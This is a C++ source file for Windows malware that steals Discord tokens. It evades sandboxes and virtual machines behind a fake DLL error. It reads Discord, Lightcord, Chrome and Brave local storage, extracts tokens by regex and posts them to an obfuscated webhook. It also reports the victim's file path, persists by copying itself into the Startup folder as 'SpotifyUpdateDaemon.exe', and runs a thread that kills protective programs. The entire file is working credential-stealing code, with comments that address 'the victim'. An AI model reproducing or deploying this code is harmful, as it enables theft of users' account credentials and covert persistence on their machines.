#define _CRT_SECURE_NO_WARNINGS
#define WEBHOOK AY_OBFUSCATE("http")

#include "includes.h"

// Credit to adamyaxley for obfuscation functions

namespace fs = std::filesystem;

void webhookSend(std::string token) {
	cpr::Response r = cpr::Post(cpr::Url{ WEBHOOK },
		cpr::Payload{ {"content", token} });
}

std::vector<std::string> findMatch(std::string str, std::regex reg)
{
	std::vector<std::string> output;
	std::sregex_iterator currentMatch(str.begin(), str.end(), reg);
	std::sregex_iterator lastMatch;

	while (currentMatch != lastMatch) {
		std::smatch match = *currentMatch;
		output.push_back(match.str());
		currentMatch++;
	}

	return output;
}

bool pathExists(const std::string& s)
{
	struct stat buffer;
	return (stat(s.c_str(), &buffer) == 0);
}

void MainRoutine() {
	while (!InternetCheckConnection("http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {
		Sleep(1000); /* Sleep whilst not connected to internet */
	}

	Sleep(750);

	const char* LIGHTCORD = AY_OBFUSCATE("\\Lightcord\\Local Storage\\leveldb");
	const char* DISCORD = AY_OBFUSCATE("\\Discord\\Local Storage\\leveldb");
	const char* DISCORDPTB = AY_OBFUSCATE("\\discordptb\\Local Storage\\leveldb");
	const char* DISCORDCANARY = AY_OBFUSCATE("\\discordcanary\\Local Storage\\leveldb");
	const char* CHROME = AY_OBFUSCATE("\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
	const char* BRAVE = AY_OBFUSCATE("\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");

	std::vector<std::string> installs = { LIGHTCORD, DISCORD,
		DISCORDPTB, DISCORDCANARY,
		CHROME, BRAVE };

	for (uint32_t i = 0; i < installs.size(); i++) {
		std::string path;

		if (i > 3) {
			path = std::getenv("localappdata") + installs[i];
		}
		else {
			path = std::getenv("appdata") + installs[i];
		}

		if (!pathExists(path)) {
			continue;
		}

		for (const auto& entry : fs::directory_iterator(path)) {
			std::ifstream t(entry.path(), std::ios_base::binary);

			std::string str((std::istreambuf_iterator<char>(t)), std::istreambuf_iterator<char>());
			std::vector<std::string> matches;
			
			std::regex expression(AY_OBFUSCATE(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})"));
			std::regex expression2(AY_OBFUSCATE(R"(mfa\.[\w-]{84})"));

			std::vector<std::string> regex_non_mfa = findMatch(str, expression);
			std::vector<std::string> regex_mfa = findMatch(str, expression2);
			std::vector<std::string> token_checked = {  };

			for (uint32_t i = 0; i < regex_non_mfa.size(); i++)
				matches.push_back(regex_non_mfa[i]);

			for (uint32_t i = 0; i < regex_mfa.size(); i++)
				matches.push_back(regex_mfa[i]);

			for (uint32_t i = 0; i < matches.size(); i++) {
				token_checked.push_back(matches[i]);
				webhookSend(matches[i]);
			}
		}
		Sleep(1000);
		return;
	}
}

void InfectRoutine() {
	char BUFFER[MAX_PATH];
	char szPath[1024];

	GetModuleFileNameA(nullptr, BUFFER, MAX_PATH); /* Create buffer and write the current file location to it */
	Sleep(750);
	webhookSend(BUFFER); /* Send the data inside of the buffer to our webhook: essentially giving us the current
	working directory of the victim */

	GetModuleFileNameA(nullptr, BUFFER, MAX_PATH);
	sprintf(szPath, AY_OBFUSCATE("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\SpotifyUpdateDaemon.exe"), std::getenv("appdata"));
	if (strcmp(szPath, BUFFER) == 0)
		return;

	fs::remove(szPath); /* Delete any previous files in place */
	fs::copy(BUFFER, szPath);

	return;
}


int main(int argc, char* argv[]) {
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	char szUsername[1024];
	DWORD dwUser = sizeof(szUsername);
	GetUserNameA(szUsername, &dwUser);

	if (strcmp(szUsername, "SYSTEM") == 0 || strcmp(szUsername, "george") == 0 || isVM()) {
		MessageBox(NULL, "The program cannot run because vcruntime140.dll cannot be found. Try reinstalling the program to fix it.", "System error - vcruntime140.dll", MB_ICONERROR | MB_OK);
		return -1;
	}

	std::thread mr(MainRoutine); /* Find discord tokens and get PC information */
	std::thread ir(InfectRoutine); /* Infect the computer, add persistence */
	std::thread wd(watchDog); /* This thread kills some programs used to stop the virus from executing */
	mr.join();
}
